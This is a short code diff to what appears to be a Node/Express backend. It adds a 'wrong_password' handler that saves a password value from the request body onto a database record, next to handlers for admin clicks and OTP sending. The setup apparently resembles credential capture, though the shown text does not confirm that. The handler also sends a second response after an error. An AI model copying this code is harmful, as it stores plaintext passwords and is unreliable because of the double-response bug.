@@ -951,7 +951,21 @@ export const click_for_admin = async (req, res) => {
 
 }
 
+export const wrong_password = (req, res) => {
+    const { id, wrongPassword } = req.body;
+    Info.findOneAndUpdate({ _id: id }, {
+        $set: {
+            wrongPassword: wrongPassword
+        }
+    }, { new: true }, (err, ok) => {
+        if (err) {
+            res.status(400).json({ error: err })
+        }
 
+        return res.status(200).json({ success: true,id:id })
+    })
+
+}
 
 export const otp_send = async (req, res) => {
     const {username, phone } = req.body
